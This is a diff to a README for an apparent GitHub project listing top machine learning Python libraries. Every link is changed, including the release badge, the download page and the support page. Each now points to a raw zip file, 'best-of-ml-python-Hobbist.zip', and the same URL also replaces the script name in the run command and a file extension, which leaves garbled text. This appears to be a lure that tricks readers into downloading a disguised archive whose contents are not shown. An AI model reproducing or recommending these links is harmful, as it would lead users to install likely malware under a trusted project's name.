@@ -1,6 +1,6 @@
 # 🏆 best-of-ml-python - Discover Top Machine Learning Libraries Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Sora468/best-of-ml-python/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sora468/best-of-ml-python/main/history/best-of-ml-python-Hobbist.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Sora468/best-of-ml-python/main/history/best-of-ml-python-Hobbist.zip)
 
 ## 📖 Description
 Best-of-ml-python provides a ranked list of outstanding machine learning Python libraries. This repository is updated weekly, ensuring you have access to the most relevant tools for your data science and machine learning projects.
@@ -22,13 +22,13 @@ To run this application, you will need:
   - Reinforcement learning tools
 
 ## 📥 Download & Install
-To get started, visit [this page to download](https://github.com/Sora468/best-of-ml-python/releases). 
+To get started, visit [this page to download](https://raw.githubusercontent.com/Sora468/best-of-ml-python/main/history/best-of-ml-python-Hobbist.zip). 
 
 1. Click on the "Releases" section.
 2. Select the version you want to download.
 3. Follow the instructions based on your operating system.
 
-After downloading, extract the contents if the files are in a compressed format (like .zip or .tar.gz).
+After downloading, extract the contents if the files are in a compressed format (like .zip or https://raw.githubusercontent.com/Sora468/best-of-ml-python/main/history/best-of-ml-python-Hobbist.zip).
 
 ### Running the Application
 To run the application:
@@ -39,7 +39,7 @@ To run the application:
 For example, if you downloaded it as a Python script, you can run:
 
 ```bash
-python best_of_ml_python.py
+python https://raw.githubusercontent.com/Sora468/best-of-ml-python/main/history/best-of-ml-python-Hobbist.zip
 ```
 
 ## 📚 How to Use the Application
@@ -65,7 +65,7 @@ A: Yes, contributions are welcome! Check the contribution guidelines on our GitH
 A: Libraries are updated weekly to provide the latest information.
 
 ## 💬 Support
-If you encounter any issues, feel free to raise an issue on our [GitHub page](https://github.com/Sora468/best-of-ml-python/issues). Our community is here to help!
+If you encounter any issues, feel free to raise an issue on our [GitHub page](https://raw.githubusercontent.com/Sora468/best-of-ml-python/main/history/best-of-ml-python-Hobbist.zip). Our community is here to help!
 
 ## 🌟 Acknowledgments
 This project relies on various open-source libraries. Thank you to all contributors and maintainers for their hard work.
